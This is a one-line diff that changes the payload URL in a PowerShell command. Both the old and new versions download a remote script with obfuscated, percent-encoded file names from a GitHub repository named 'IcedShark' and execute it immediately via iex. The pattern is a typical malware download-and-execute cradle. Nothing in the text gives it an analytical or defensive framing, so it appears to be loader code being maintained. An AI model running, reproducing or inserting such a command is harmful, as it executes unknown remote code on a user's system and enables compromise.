@@ -1,1 +1,1 @@
-powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/Savitar407/IcedShark/main/!%40%24SFGF.ps1’)”
+powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/Savitar407/IcedShark/main/(%23%26%24%5E%23%24%5E.ps1’)”
